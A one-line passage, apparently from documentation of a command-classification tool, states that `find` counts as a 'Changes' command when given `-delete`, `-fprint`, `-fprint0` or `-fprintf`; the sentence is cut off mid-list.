 - `find` is `Changes` with `-delete`, `-fprint`, `-fprint0`, `-fprintf` or
